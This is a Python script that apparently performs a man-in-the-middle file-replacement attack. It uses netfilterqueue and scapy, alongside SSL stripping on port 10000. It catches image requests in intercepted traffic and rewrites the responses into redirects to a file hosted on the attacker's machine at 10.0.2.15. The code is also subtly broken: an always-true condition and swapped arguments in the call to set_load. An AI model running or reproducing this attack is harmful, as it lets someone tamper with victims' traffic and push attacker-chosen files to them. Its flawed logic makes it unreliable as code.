#!/usr/bin/env python

import netfilterqueue
import scapy.all as scapy

ack_list = []
# ack and seq are same for corresponding request and response


def set_load(packet, load):
    load = load.replace("HTTP/1.1", "HTTP/1.0")
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 10000:  # Using port 10000 when using ssl stripping
            if ".jpg" or ".imp" in scapy_packet[scapy.Raw].load and "10.0.2.15" not in scapy_packet[scapy.Raw].load:
                print("[+] Image Request")
                ack_list.append(scapy_packet[scapy.TCP].ack)  # Appending the ack number to the ack_list

        elif scapy_packet[scapy.TCP].sport == 10000:
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)  # Removing the seq number from the list
                print("[+] Replacing Files")
                load = str(scapy_packet[scapy.Raw].load)
                modified_packet = set_load("HTTP/1.1 301 Moved Permanently\nLocation: http://10.0.2.15/White-DEVil/FBI.jpg\n\n", load)

                packet.set_payload(str(modified_packet))

    packet.accept()


try:
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()
except KeyboardInterrupt:
    print("\nKeyboardInterruption detected ...Quiting ...")